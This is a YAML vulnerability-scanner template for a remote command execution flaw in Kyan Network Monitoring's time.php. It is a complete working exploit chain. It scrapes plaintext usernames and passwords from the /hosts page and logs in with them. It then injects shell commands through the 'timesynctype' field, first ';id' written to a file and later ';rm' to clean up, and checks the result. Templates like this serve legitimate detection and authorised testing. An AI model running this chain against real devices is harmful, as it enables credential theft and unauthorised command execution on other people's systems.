id: kyan-time-rce

info:
  name: Kyan Network Monitoring Time RCE
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    This template exploits a remote command execution vulnerability in Kyan Network Monitoring time.php.
  reference:
    - https://github.com/Threekiii/Awesome-POC/blob/master/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/Kyan%20%E7%BD%91%E7%BB%9C%E7%9B%91%E6%8E%A7%E8%AE%BE%E5%A4%87%20time.php%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md

variables:
  session_id: '{{rand_text_alphanumeric(26)}}'
  temp_file: '{{rand_text_alpha(8)}}'

http:
  - id: step-1
    method: GET
    path:
      - '{{BaseURL}}/hosts'
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: regex
        part: body
        regex:
          - "UserName=(.+)\\sPassword=(.+)"
    extractors:
      - type: regex
        part: body
        regex:
          - "UserName=(.+)\\sPassword=(.+)"
        group: 1
        name: username
      - type: regex
        part: body
        regex:
          - "UserName=(.+)\\sPassword=(.+)"
        group: 2
        name: password

  - id: step-2
    method: POST
    path:
      - '{{BaseURL}}/login.php'
    headers:
      Content-Type: application/x-www-form-urlencoded
      Cookie: PHPSESSID={{session_id}}
    body: 'user={{username}}&passwd={{password}}&x=56&y=21'
    redirects: true
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "设备管理系统"

  - id: step-3
    method: POST
    path:
      - '{{BaseURL}}/time.php'
    headers:
      Content-Type: application/x-www-form-urlencoded
      Cookie: PHPSESSID={{session_id}}
    body: 'timesynctype=;id>{{temp_file}}.txt'
    matchers:
      - type: status
        status:
          - 200

  - id: step-4
    method: GET
    path:
      - '{{BaseURL}}/{{temp_file}}.txt'
    headers:
      Cookie: PHPSESSID={{session_id}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "uid="

  - id: step-5
    method: POST
    path:
      - '{{BaseURL}}/time.php'
    headers:
      Content-Type: application/x-www-form-urlencoded
      Cookie: PHPSESSID={{session_id}}
    body: 'timesynctype=%3Brm%20{{temp_file}}.txt'
    matchers:
      - type: status
        status:
          - 200
